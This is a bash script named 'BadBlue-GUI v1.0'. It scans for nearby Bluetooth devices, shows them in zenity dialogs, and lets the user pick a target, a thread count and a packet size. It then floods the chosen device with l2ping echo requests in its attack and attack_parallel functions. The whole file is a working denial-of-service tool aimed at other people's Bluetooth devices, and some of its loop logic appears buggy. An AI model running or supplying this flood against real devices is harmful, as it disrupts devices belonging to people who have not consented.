#!/bin/bash
clean() {
    rm cache
}

scan() {
    bluetoothctl scan on
}

scan
pick-list-devices() {
    clean
    ID="$(bluetoothctl devices | cut -f2 -d" ")"
    for id in $ID; do
        NAME=$(bluetoothctl devices | grep $id | cut -f3 -d" ")
        for name in $NAME; do
            echo "$id $NAME" >>cache
        done
    done
}

attack() {
    sudo l2ping -i hci0 -s $1 $2 -t 5
}

attack_parallel() {

    for th in $1; do
        COMMAND_PARALLEL=$(echo -e "sudo l2ping -i hci0 -s $2 $3 -t 5\n$COMMAND_PARALLEL")
    done

    echo $COMMAND_PARALLEL | xargs -t -P $1
}

pick-list-devices
DEVICE=$(
    zenity --title="BadBlue-GUI v1.0" --text="Pick a Device" --list --column="Devices ID" --column="Device Name" $(cat cache)
)

if [ "$?" != 0 ]; then
    exit
fi

THREADS=$(
    zenity --title="BadBlue-GUI v1.0" --text="Number of Threads for Attack in $DEVICE" --list --column="Threads" $(JOBS=$(nproc) && seq 1 $JOBS | tr "\n" " ")
)

if [ "$?" != 0 ]; then
    exit
fi

PACKAGE_SIZE=$(
    zenity --list --title="BadBlue-GUI v1.0" --text="Package Size" --column="Size" 100 200 600 700 1000
)

if [ "$?" != 0 ]; then
    exit
fi

if (("$THREADS" > "1")); then
    attack_parallel $THREADS $PACKAGE_SIZE $DEVICE
else
    attack $PACKAGE_SIZE $DEVICE
fi
